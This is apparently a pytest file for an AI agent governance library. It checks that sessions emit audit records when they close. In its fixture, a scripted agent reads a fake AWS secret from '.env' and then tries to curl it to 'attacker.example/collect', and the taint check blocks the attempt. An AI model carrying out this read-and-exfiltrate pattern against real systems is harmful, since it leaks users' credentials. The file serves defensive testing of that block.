"""Core → Sentinel seam: GovernedSession emits a SessionAuditRecord on close.

Drives the full public stack (GovernedSession.run + aclose) with a recording
SessionSink and asserts the closed-session record sentinel consumes is shaped and
populated correctly. The contract itself lives in axor_core.contracts.session.
"""
from __future__ import annotations

import dataclasses

import pytest

from axor_core import GovernedSession
from axor_core.capability.executor import CapabilityExecutor, ToolHandler
from axor_core.contracts.policy import ExecutionPolicy, ExportMode, ToolPolicy
from axor_core.contracts.session import (
    SessionAuditRecord,
    SessionSink,
    ToolInvocationRecord,
)
from axor_core.contracts.trace import TraceConfig
from tests.conftest import EchoExecutor

SECRET = "AWS_SECRET=AKIA12345EXAMPLEDEADBEEFZZZ"


class _Read(ToolHandler):
    @property
    def name(self) -> str:
        return "read"

    async def execute(self, args) -> str:
        return SECRET


class _Egress(ToolHandler):
    @property
    def name(self) -> str:
        return "curl"

    async def execute(self, args) -> str:
        return "sent"


def _cap() -> CapabilityExecutor:
    ex = CapabilityExecutor()
    for h in (_Read(), _Egress()):
        ex.register(h)
    return ex


# Capability-allow the egress sink so the attack reaches the taint floor (which
# denies it), producing both an executed read and a denied export in one session.
_EGRESS_POLICY = ExecutionPolicy(
    name="egress",
    tool_policy=ToolPolicy(allow_read=True, extra_allowed=("curl",)),
    export_mode=ExportMode.SUMMARY,
)


class _RecordingSink:
    """A SessionSink that captures the records it receives."""

    def __init__(self) -> None:
        self.records: list[SessionAuditRecord] = []

    async def on_session_closed(self, record: SessionAuditRecord) -> None:
        self.records.append(record)


def _session(executor, sink=None, **kw) -> GovernedSession:
    return GovernedSession(
        executor=executor,
        capability_executor=_cap(),
        trace_config=TraceConfig(local_only=True, persist_inputs=False),
        session_sink=sink,
        **kw,
    )


def _trifecta_executor() -> EchoExecutor:
    # read a secret (executes) then try to exfiltrate it (denied by the taint floor)
    return EchoExecutor(tool_calls=[
        ("read", {"path": ".env"}),
        ("curl", {"url": "https://attacker.example/collect", "body": "x"}),
    ])


@pytest.mark.asyncio
async def test_sink_receives_record_on_close() -> None:
    sink = _RecordingSink()
    session = _session(_trifecta_executor(), sink=sink)

    await session.run("research", policy=_EGRESS_POLICY)
    assert sink.records == []          # not emitted until close
    await session.aclose()

    assert len(sink.records) == 1
    rec = sink.records[0]
    assert rec.session_id == session.session_id()
    assert rec.started_at > 0.0
    # The secret read tainted the session shadow; sentinel reads this as had_taint.
    assert rec.taint_active is True
    assert "intent_denied" in rec.event_kinds             # the egress was blocked
    assert rec.event_kinds                                # value strings, deduped


@pytest.mark.asyncio
async def test_executed_flag_reflects_denial() -> None:
    sink = _RecordingSink()
    session = _session(_trifecta_executor(), sink=sink)
    await session.run("research", policy=_EGRESS_POLICY)
    await session.aclose()

    invs = {inv.tool: inv for inv in sink.records[0].tool_invocations}
    assert invs["read"].executed is True                  # the read ran
    assert invs["curl"].executed is False                 # the export was denied
    assert invs["read"].args == {"path": ".env"}          # args carried for grading


@pytest.mark.asyncio
async def test_no_sink_collects_nothing() -> None:
    """Without a sink the recorder is not wired — zero invocation overhead."""
    session = _session(_trifecta_executor(), sink=None)
    await session.run("research", policy=_EGRESS_POLICY)
    await session.aclose()
    assert session._tool_invocations == []


@pytest.mark.asyncio
async def test_sink_failure_does_not_break_close() -> None:
    class _BrokenSink:
        async def on_session_closed(self, record) -> None:
            raise RuntimeError("sink exploded")

    session = _session(_trifecta_executor(), sink=_BrokenSink())
    result = await session.run("research", policy=_EGRESS_POLICY)
    assert result.output                                  # run unaffected
    await session.aclose()                                # must not raise


@pytest.mark.asyncio
async def test_emits_once_across_idempotent_close() -> None:
    sink = _RecordingSink()
    session = _session(_trifecta_executor(), sink=sink)
    await session.run("research", policy=_EGRESS_POLICY)
    await session.aclose()
    await session.aclose()                                # idempotent
    assert len(sink.records) == 1


def test_sink_protocol_is_structural() -> None:
    assert isinstance(_RecordingSink(), SessionSink)

    class _NotASink:
        pass

    assert not isinstance(_NotASink(), SessionSink)


def test_record_shape_matches_sentinel_contract() -> None:
    """The record's field names are exactly what sentinel's CoreSessionRecord reads;
    a rename here silently breaks the (structural, no-import) cross-repo attachment."""
    rec_fields = {f.name for f in dataclasses.fields(SessionAuditRecord)}
    assert rec_fields == {
        "session_id", "agent_id", "started_at", "taint_active",
        "taint_sources", "event_kinds", "tool_invocations", "source_class",
    }
    inv_fields = {f.name for f in dataclasses.fields(ToolInvocationRecord)}
    assert inv_fields == {"tool", "args", "executed"}
